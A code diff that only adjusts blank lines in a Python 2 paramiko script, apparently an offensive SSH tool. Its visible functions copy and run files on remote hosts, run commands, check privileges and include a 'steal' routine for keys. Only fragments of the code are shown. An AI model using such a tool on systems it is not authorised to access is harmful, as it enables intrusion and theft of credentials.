@@ -15,11 +15,13 @@ CRED = '\033[91m'
 CEND = '\033[0m'
 CGREEN  = '\33[32m'
 CYELLOW = '\33[33m'
-
 paramiko.util.log_to_file("filename.log")
+
+
 def randomword(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))
+
 
 def connect(ip, username, password, identity_file):
     client = paramiko.SSHClient()
@@ -63,6 +65,7 @@ def copy_exec(ip, username, password, identity_file, file, timeout):
     except socket.timeout:
         print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
 
+
 def steal(ip, username, password, identity_file, type, timeout):
     client = connect(ip, username, password, identity_file)
     if type == "keys":
@@ -84,6 +87,7 @@ def steal(ip, username, password, identity_file, type, timeout):
     except socket.timeout:
         print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
 
+
 def execute_command(ip, username, password, identity_file, command, timeout):
     client = connect(ip, username, password, identity_file)
     try:
@@ -94,6 +98,7 @@ def execute_command(ip, username, password, identity_file, command, timeout):
                 print line.strip()
     except socket.timeout:
         print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
+
 
 def check_privs(ip, username, password, identity_file, timeout):
     client = connect(ip, username, password, identity_file)
